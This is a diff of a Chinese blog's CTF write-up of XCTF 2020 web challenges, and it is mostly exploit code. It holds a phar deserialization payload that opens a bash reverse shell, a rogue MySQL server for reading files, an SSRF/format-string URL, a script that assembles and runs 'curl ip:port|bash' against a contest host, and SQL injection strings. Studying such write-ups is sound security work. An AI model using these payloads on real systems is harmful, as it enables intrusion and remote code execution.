@@ -108,17 +108,18 @@
 
 
 
-  <meta name="description" content="web 前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
+  <meta name="description" content="前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
+<meta name="keywords" content="Web,复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xctf战役-2020(web部分复现)">
 <meta property="og:url" content="https://cy9nusg4rd3n.github.io/2020/03/15/xctf战役-2020-web部分复现/index.html">
 <meta property="og:site_name" content="Cy9nus&#39;s Blog">
-<meta property="og:description" content="web 前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
+<meta property="og:description" content="前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-04-03T15:39:08.362Z">
+<meta property="og:updated_time" content="2020-04-18T04:03:30.417Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xctf战役-2020(web部分复现)">
-<meta name="twitter:description" content="web 前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
+<meta name="twitter:description" content="前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西webct   扫面发现源码www.zip,其中注意的是**uoloads**目录有个.htaccess1php_flag engine off">
 
 
 
@@ -437,6 +438,24 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTFWP/" itemprop="url" rel="index"><span itemprop="name">CTFWP</span></a></span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -481,8 +500,8 @@
       
 
       
-        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><ul>
-<li>前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西<h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2></li>
+        <ul>
+<li>前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西<h1 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h1></li>
 </ul>
 <ol>
 <li>扫面发现源码<a href="http://www.zip,其中注意的是**uoloads**目录有个.htaccess" target="_blank" rel="noopener">www.zip,其中注意的是**uoloads**目录有个.htaccess</a><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br></pre></td></tr></table></figure>
@@ -545,16 +564,16 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>首先生成phar文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$payload=<span class="keyword">new</span> Listfile();</span></span><br><span class="line"><span class="php">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1")'</span>;</span></span><br><span class="line"><span class="php">$file=<span class="keyword">new</span> Fileupload();</span></span><br><span class="line"><span class="php">$file-&gt;file=$payload;</span></span><br><span class="line"><span class="php">unlink(<span class="string">"./phar.phar"</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($file);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($file));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=<span class="keyword">new</span> Listfile();</span><br><span class="line">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1")'</span>;</span><br><span class="line">$file=<span class="keyword">new</span> Fileupload();</span><br><span class="line">$file-&gt;file=$payload;</span><br><span class="line">unlink(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($file));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>改后缀为jpg上传，启动伪造服务器</p>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8 </span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename="phar:////var/www/html/uploads/phar.jpg"</span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind(("",3309))</span><br><span class="line">sv.listen(5)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info('Conn from: <span class="comment">%r', address)</span></span><br><span class="line">conn.sendall("<span class="tag">\<span class="name">x</span></span>4a<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>33<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>17<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>7a<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>54<span class="tag">\<span class="name">x</span></span>76<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xf</span></span>7<span class="tag">\<span class="name">x</span></span>21<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>80<span class="tag">\<span class="name">x</span></span>15<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>70<span class="tag">\<span class="name">x</span></span>76<span class="tag">\<span class="name">x</span></span>21<span class="tag">\<span class="name">x</span></span>3d<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>5c<span class="tag">\<span class="name">x</span></span>5a<span class="tag">\<span class="name">x</span></span>32<span class="tag">\<span class="name">x</span></span>2a<span class="tag">\<span class="name">x</span></span>7a<span class="tag">\<span class="name">x</span></span>49<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>6d<span class="tag">\<span class="name">x</span></span>79<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>71<span class="tag">\<span class="name">x</span></span>6c<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>76<span class="tag">\<span class="name">x</span></span>65<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>70<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>77<span class="tag">\<span class="name">x</span></span>6f<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>64<span class="tag">\<span class="name">x</span></span>00")</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info("auth okay")</span><br><span class="line">conn.sendall("<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00")</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info("want file...")</span><br><span class="line">wantfile=chr(len(filename)+1)+"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">xFB</span></span>"+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(9999)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"phar:////var/www/html/uploads/phar.jpg"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>payload如下，然后<strong>nv -lvp port</strong>反弹shell</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=ip:port<span class="variable">&amp;user</span>=user<span class="variable">&amp;password</span>=passsword<span class="variable">&amp;option</span>=<span class="number">8</span></span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><ol>
+<h1 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h1><ol>
 <li><p>题目直接给了源码</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123; </span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>; </span></span><br><span class="line"><span class="php">    extract($_GET); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123; </span></span><br><span class="line">        die('Head can\'t be like this!'); </span><br><span class="line">    &#125; </span><br><span class="line">    if(preg_match('/log/i',$url))&#123; </span><br><span class="line">        die('No No No'); </span><br><span class="line">    &#125; </span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123; </span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $ch = $funcname(); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123; </span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url); </span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span></span><br><span class="line"><span class="php">        $output = curl_exec($ch); </span></span><br><span class="line"><span class="php">        curl_close($ch); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>); </span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
 </li>
@@ -581,7 +600,7 @@
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=<span class="link">http://localhost:8080/read/file=&#123;vipfile.__class__.__init__.__globals__</span>[<span class="string">vipreadfile</span>]._<span class="emphasis">_module_</span><span class="emphasis">_[9]&#125;l4g_</span>1s<span class="emphasis">_h3re_</span>u<span class="emphasis">_wi11_</span>rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><ol>
+<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><ol>
 <li>代码审计发现不同的session处理<a href="https://blog.csdn.net/weixin_44304686/article/details/91539645" target="_blank" rel="noopener">PHP反序列化入门之session反序列化</a></li>
 <li><p>在签名处存在反序列化漏洞，只要用户名为admin就能访问/core/index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign=<span class="string">"test_sign"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:9:"test_sign";&#125;</span></span><br></pre></td></tr></table></figure>
@@ -602,7 +621,7 @@
 <li>直接上脚本<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from <span class="built_in">time</span> <span class="keyword">import</span> sleep</span><br><span class="line">from urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"># generate <span class="string">"g&gt; ht- sl"</span> to file <span class="string">"v"</span></span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"><span class="string">'&gt;ht-'</span>,</span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"># reverse file <span class="string">"v"</span> to file <span class="string">"x"</span>, content <span class="string">"ls -th &gt;g"</span></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"><span class="string">'*v&gt;x'</span>,</span><br><span class="line"># generate <span class="string">"curl ip:port|bash;"</span></span><br><span class="line"><span class="string">'&gt;sh'</span>,</span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;28\\'</span>,</span><br><span class="line"><span class="string">'&gt;1\\'</span>,</span><br><span class="line"><span class="string">'&gt;3.\\'</span>,</span><br><span class="line"><span class="string">'&gt;24\\'</span>,</span><br><span class="line"><span class="string">'&gt;8.\\'</span>,</span><br><span class="line"><span class="string">'&gt;9\\'</span>,</span><br><span class="line"><span class="string">'&gt;7.\\'</span>,</span><br><span class="line"><span class="string">'&gt;4\\'</span>,</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"><span class="string">'sh x'</span>,</span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"># got shell</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=ab2f2756d83f058180b6a0ae53ef8396"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">data</span> = &#123;<span class="string">"url"</span>:<span class="string">"compress.zlib://data:@127.0.0.1/plain;base64,&#123;&#125;"</span>&#125;</span><br><span class="line">r0 = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>)</span><br><span class="line">print r0.<span class="keyword">text</span></span><br><span class="line">r = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> payload:</span><br><span class="line">    data1 = <span class="keyword">data</span>[<span class="string">"url"</span>].format(base64.b64encode(i))</span><br><span class="line">    data2 = &#123;<span class="string">"url"</span>:data1&#125;</span><br><span class="line">    assert len(i) &lt;= <span class="number">4</span></span><br><span class="line">    r1 = r.post(url = <span class="string">'http://121.36.222.22:88/core/index.php'</span>,headers = header,<span class="keyword">data</span> = data2)</span><br><span class="line">    print r1.content</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><ol>
+<h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><ol>
 <li>传入2020 和Y都能查出结果，传入y20，yy，20y也可以，传入’union select 这些会爆服务器500。猜测后端对参数做了date()转换，用\可以使date后的字符串不变(新姿势)</li>
 <li><p>那就好说了，可以联查</p>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="symbol">\u</span><span class="symbol">\n</span><span class="symbol">\i</span><span class="symbol">\o</span><span class="symbol">\n</span> <span class="symbol">\s</span><span class="symbol">\e</span><span class="symbol">\l</span><span class="symbol">\e</span><span class="symbol">\c</span><span class="symbol">\t</span> 1,<span class="symbol">\g</span><span class="symbol">\r</span><span class="symbol">\o</span><span class="symbol">\u</span><span class="symbol">\p</span>_<span class="symbol">\c</span><span class="symbol">\o</span><span class="symbol">\n</span><span class="symbol">\c</span><span class="symbol">\a</span><span class="symbol">\t</span>(<span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span>_<span class="symbol">\n</span><span class="symbol">\a</span><span class="symbol">\m</span><span class="symbol">\e</span>),3 <span class="symbol">\f</span><span class="symbol">\r</span><span class="symbol">\o</span><span class="symbol">\m</span> <span class="symbol">\i</span><span class="symbol">\n</span><span class="symbol">\f</span><span class="symbol">\o</span><span class="symbol">\r</span><span class="symbol">\m</span><span class="symbol">\a</span><span 